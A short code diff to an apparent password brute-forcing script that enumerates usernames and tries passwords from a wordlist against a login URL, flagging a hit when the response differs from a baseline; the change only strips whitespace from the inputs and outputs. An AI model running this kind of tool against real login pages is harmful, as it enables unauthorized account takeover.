@@ -59,13 +59,13 @@ def enumerate_pass(url, user, password_file_list, headers, cookies):
         for password in file.readlines():
             res = make_pass_call(
                 url,
-                user=user,
-                password=password,
+                user=user.strip(),
+                password=password.strip(),
                 headers=headers,
                 cookies=cookies
             )
             if res.text != demarcation_response.text:
-                return password
+                return password.strip()
 
 def main():
     users = enumerate_user(
@@ -84,6 +84,6 @@ def main():
             cookies=cookies
         )
         print(user.strip(), ':', password.strip())
-        
+
 if __name__ == '__main__':
     main()
